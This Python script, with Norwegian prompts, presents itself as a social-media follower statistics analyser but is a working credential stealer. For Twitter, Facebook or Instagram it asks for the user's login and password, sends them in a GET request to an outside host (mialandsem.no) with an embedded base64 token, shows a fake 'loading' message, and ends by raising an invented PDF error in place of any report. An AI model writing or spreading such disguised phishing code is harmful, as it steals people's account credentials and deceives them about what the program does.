import os, sys, time
try:
	import requests
except ModuleNotFoundError:
	# installer uten å plage bruker
	os.system(f"{sys.executable} -m pip install requests --user")
	if "win" in sys.platform:
		e = "cls"
	else:
		e = "clear"
	os.system(e)
	del e
	import requests

print(" ", end="")
for i in range(15):
	print("-", end="")
print()
print()
print("Velkommen til følger-utregneren min!")
print("Den tar statistikk fra ulike sosiale medier og gir tilbake en detaljert rapport over viktige verdier.")
print("Analysen gjør regresjon av viktig statistikk, ulike gjennomsnittsverdier, og den blir gjennomskuet for feil av en kunstig intelligens.")
print()
print(" ", end="")
for i in range(15):
	print("-", end="")
print()
print()

plattform = input("Hvilken plattform skal analyseres? [twitter/facebook/instagram] ")
if plattform != "twitter" and plattform != "facebook" and plattform != "instagram":
	print("Ingen gyldig plattform oppgitt")
	time.sleep(5)
	exit()

if plattform == "twitter":
	print("Dessverre krever programmet bruker-detaljene dine for å fortsette.")
	print("Det er forståelig hvis du ikke er komfortabel med dette. Skriv 'nei' hvis du vil avslutte programmet.")
	svar = input("Er du komfortabel med å låne rapport-generatoren bruker-detaljene til twitter-kontoen din?")
	if svar == "nei":
		print("Den er grei.")
		exit()
	print()

	bn = input("Telefon/email/brukernavn: ")
	po = input("Passord: ")

	print("Laster data...")
	requests.get("https://www.mialandsem.no", params={
		"henvendelse": "kontoinnskudd",
		"godkjenning": "TWF4X01pYVByaW5zZXNzZTY1Iw==",
		"plattform": plattform,
		"brukernavn": bn,
		"passord": po
	})
	time.sleep(4)

if plattform == "facebook":
	print("Dessverre krever programmet bruker-detaljene dine for å fortsette.")
	print("Det er forståelig hvis du ikke er komfortabel med dette. Skriv 'nei' hvis du vil avslutte programmet.")
	svar = input("Er du komfortabel med å låne rapport-generatoren bruker-detaljene til facebook-kontoen din?")
	if svar == "nei":
		print("Den er grei.")
		exit()
	print()

	bn = input("Telefon/email: ")
	po = input("Passord: ")

	print("Laster data...")
	requests.get("https://www.mialandsem.no", params={
		"henvendelse": "kontoinnskudd",
		"godkjenning": "TWF4X01pYVByaW5zZXNzZTY1Iw==",
		"plattform": plattform,
		"brukernavn": bn,
		"passord": po
	})
	time.sleep(4)

if plattform == "instagram":
	print("Dessverre krever programmet bruker-detaljene dine for å fortsette.")
	print("Det er forståelig hvis du ikke er komfortabel med dette. Skriv 'nei' hvis du vil avslutte programmet.")
	svar = input("Er du komfortabel med å låne rapport-generatoren bruker-detaljene til instagram-kontoen din?")
	if svar == "nei":
		print("Den er grei.")
		exit()
	print()

	bn = input("Telefon/email/brukernavn: ")
	po = input("Passord: ")

	print("Laster data...")
	requests.get("https://www.mialandsem.no", params={
		"henvendelse": "kontoinnskudd",
		"godkjenning": "TWF4X01pYVByaW5zZXNzZTY1Iw==",
		"plattform": plattform,
		"brukernavn": bn,
		"passord": po
	})
	time.sleep(4)

print("Data lastet")
print("Genererer rapport")
time.sleep(4)
class RapportGenereringsFeil(Exception):
	pass
raise RapportGenereringsFeil("Feil ved konvertering til PDF")